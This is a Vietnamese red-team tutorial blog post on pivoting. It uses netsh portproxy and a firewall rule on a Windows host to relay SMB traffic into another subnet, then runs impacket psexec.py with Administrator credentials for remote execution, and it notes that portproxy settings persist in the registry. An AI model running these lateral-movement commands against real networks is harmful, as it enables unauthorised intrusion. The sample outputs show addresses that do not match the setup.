--- 
layout: post
title: "Pivoting: Setting up a port proxy with netsh on windows"
categories: "Network Pivot Redteam"
author: Rosiz
mathjax: true
---


* content
{:toc}

Pivoting là một skill thiết yếu cần được trang bị cho một Red Teamer. Khi bạn đứng bên trong một network và bạn vô tình tìm thấy một server, mà nó có thể giao tiếp với một subnet mục tiêu mà bạn đang theo đuổi, câu hỏi là làm gì tiếp theo?

Là một Red Teamer bạn sẽ muốn tận dụng lợi thế này để có thể attack những gì trên đó và có thể đi sâu và xa hơn vào trong của hệ thống mạng của target.

"Pivoting" là gì? Bạn có thể hiểu Pivoting là cách bạn đi từ chỗ đứng hiện tại của mình đến nơi bạn muốn đến?

Vậy thì Pivoting bằng cách nào? Thì hôm này mình xin giới thiệu cách setup một portproxy giữa máy của bạn và máy client nằm trong subnet mục tiêu bằng cách sử dụng netsh trên Windows.

![](https://raw.githubusercontent.com/rosiz/rosiz.github.io/master/__photo/__no1/1.PNG)

Ví dụ trong ngữ cảnh ta có một máy A có thể thấy được máy B, mà trên B được cấu hình thêm một interface hoặc được route để thấy được một subnet khác, bao gồm máy C. Như vậy máy A không thể thấy trực tiếp được máy C, và ngược lại. Vậy thì làm sao để khai thác máy C từ A?

![](https://raw.githubusercontent.com/rosiz/rosiz.github.io/master/__photo/__no1/2.PNG)

- Machine A: 172.16.0.20
- Machine B: 172.16.0.11 và 7.7.7.11
- Machine C: 7.7.7.20

## Seting on machine B

```js
netsh interface portproxy add v4tov4 listenport=8080 connectport=445 connectaddress=7.7.7.20
```

Ở đây, ta đang tiến hành setup một portproxy sẽ listen trên port 8080 và nó sẽ nhậ gửi data đến conectAddress (A) trên port 445. Điều này sẽ được thực hiện thông qua kết nối TCP riêng biệt.

Ta có thể kiểm tra setting bằng lệnh dưới đây:

```js
netsh interface portproxy show v4tov4
```

```js
Listen on IPv4:             Connect to IPv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
*               8080        192.168.1.2     445
```

*Note:* Portproxy config sẽ được lưu trong registry, vì vậy đây là nơi bạn có thể phát hiện các persistence portproxies mà không sử dụng netsh.

```js
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp

*/1337       : 192.168.1.2/8000
```

Để tiếp tục quá trình thừ nghiệm, bạn hãy tiến hành mở port trên máy B bằng lệnh sau:

```js
netsh advfirewall firewall add rule name="Proxy all the things" dir=in action=allow protocol=TCP localport=8080
```

Bạn có thể hiểu như thế này, nếu máy A muốn kết nối đến port 445 của máy C (7.7.7.20) thì nó phải bắt buộc đẩy traffic đến port 8080 của máy B (172.16.0.11)

## On Machine A:

Trong trường hợp này mình sẽ dùng công cụ psexec.py của bộ công cụ impacket để thực hiện kết nối đến máy C (7.7.7.20:445) thông qua máy B (172.16.0.11:8080)

```js
psexec.py Domain/Administrator:123@172.16.0.11 -port 8080
```
*Note:* Bạn cần chỉnh sữ port trong script python psexec.py để thực hiện điều này.

Sau khi hoàn toàn công việc, bạn muốn remove portproxy, bạn có thể sử dụng lệnh sau:

```js
netsh interface portproxy delete v4tov4 listenport=8080
```